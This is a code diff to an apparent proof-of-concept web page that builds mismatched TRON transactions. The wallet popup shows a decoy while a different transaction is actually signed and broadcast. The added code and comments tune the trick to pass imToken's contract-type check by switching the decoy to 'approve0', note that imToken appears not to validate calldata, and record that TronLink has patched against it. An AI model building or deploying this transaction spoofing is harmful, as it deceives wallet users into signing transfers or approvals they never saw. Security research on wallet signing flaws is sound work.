@@ -223,6 +223,7 @@
           <div class="row mt">
             <button id="buildBtn" type="button">Build mismatch</button>
             <button id="signBtn" type="button" class="primary">Open wallet popup</button>
+            <button id="testSignBtn" type="button" title="Sign the actual (non-mismatched) tx to verify the sign() path works">Sign test (actual tx)</button>
           </div>
         </section>
 
@@ -377,11 +378,16 @@
         if (/nile/i.test(state.network) && !$("tokenContract").value.trim()) $("tokenContract").value = NILE_USDT;
         if (/^mainnet/i.test(state.network) && !$("tokenContract").value.trim()) $("tokenContract").value = MAINNET_USDT;
         if (state.isImToken) {
-          if ($("decoyType").value !== "manualTransfer") $("decoyType").value = "manualTransfer";
+          // manualTransfer (cross-type) is rejected by imToken native bridge's contract-type consistency check.
+          // approve0 keeps both sides as TriggerSmartContract so the type check passes;
+          // only the calldata amount differs — imToken does not appear to validate ABI-level calldata.
+          if ($("decoyType").value === "manualTransfer" || $("decoyType").value === "transferTrx") {
+            $("decoyType").value = "approve0";
+          }
           if ($("signRoute").value === "tronWebSend") $("signRoute").value = "tronWebSignAndSend";
-          $("decoyToLabel").style.display = "";
-          $("decoyTrxLabel").style.display = "";
-          $("decoyAmountLabel").style.display = "none";
+          $("decoyToLabel").style.display = "none";
+          $("decoyTrxLabel").style.display = "none";
+          $("decoyAmountLabel").style.display = "";
         }
       }
 
@@ -576,8 +582,18 @@
           const signed = normalizeSignedResult(await state.tronWeb.trx.sign(tx));
           log("sign() returned", signed);
           if (!signed?.signature?.length) {
-            const hint = state.isImToken ? "" : " (TronLink may have rejected the mismatch at sign stage)";
-            throw new Error("sign() returned no signature." + hint);
+            const decoyT = tx.raw_data?.contract?.[0]?.type;
+            const hints = [];
+            if (state.isImToken) {
+              if (decoyT === "TransferContract") {
+                hints.push("imToken native bridge enforces contract-type consistency: raw_data=" + decoyT + " vs raw_data_hex=TriggerSmartContract → switch Decoy type to 'approve0'");
+              } else {
+                hints.push("imToken rejected at sign stage. Possible causes: (1) User declined popup, (2) bridge validates calldata ABI, (3) transaction expired. Try 'Sign test (actual tx)' to verify the sign path itself.");
+              }
+            } else {
+              hints.push("TronLink has patched sign() to detect raw_data/raw_data_hex mismatches.");
+            }
+            throw new Error("sign() returned no signature. " + hints.join(" | "));
           }
           log("Step 2 — Broadcasting via tronWeb.trx.sendRawTransaction", { txID: signed.txID });
           result = await state.tronWeb.trx.sendRawTransaction(signed);
@@ -805,6 +821,28 @@
       $("connectBtn").addEventListener("click", () => runButton("connectBtn", connectWallet));
       $("buildBtn").addEventListener("click", () => runButton("buildBtn", buildMismatch));
       $("signBtn").addEventListener("click", () => runButton("signBtn", signMismatch));
+      $("testSignBtn").addEventListener("click", () => runButton("testSignBtn", async function testSignActual() {
+        detectProviders();
+        const tronWeb = state.tronWeb;
+        if (!tronWeb?.trx?.sign) throw new Error("tronWeb.trx.sign is unavailable.");
+        const owner = toBase58(state.account || tronWeb.defaultAddress?.base58);
+        if (!owner) throw new Error("Connect a TRON account first.");
+        const tokenContract = requireAddress("tokenContract", "", "TRC20 contract");
+        const spender = toBase58(requireAddress("spender", owner, "Approve spender"));
+        const feeLimit = Number(integerText("feeLimit", "Fee limit"));
+        const triggerResult = await tronWeb.transactionBuilder.triggerSmartContract(
+          tokenContract, "approve(address,uint256)", { feeLimit, callValue: 0 },
+          [{ type: "address", value: spender }, { type: "uint256", value: "1000000" }], owner
+        );
+        const actualTx = triggerResult.transaction || triggerResult;
+        log("Signing LEGITIMATE (non-mismatched) actualTx to diagnose sign() path", { txID: actualTx.txID, type: actualTx.raw_data?.contract?.[0]?.type });
+        const signed = normalizeSignedResult(await tronWeb.trx.sign(actualTx));
+        if (signed?.signature?.length) {
+          log("✅ sign() works for legitimate tx — sign path is functional. Signature obtained.", { sig: short(signed.signature?.[0], 16, 8) });
+        } else {
+          log("❌ sign() returned no signature even for a LEGITIMATE tx. The sign() bridge itself may be broken or wallet not properly connected.", signed);
+        }
+      }));
       $("copyTxBtn").addEventListener("click", () => copyText($("mismatchJson").value, "Mismatched transaction"));
       $("copySignedBtn").addEventListener("click", () => copyText($("signedJson").value, "Wallet result"));
 
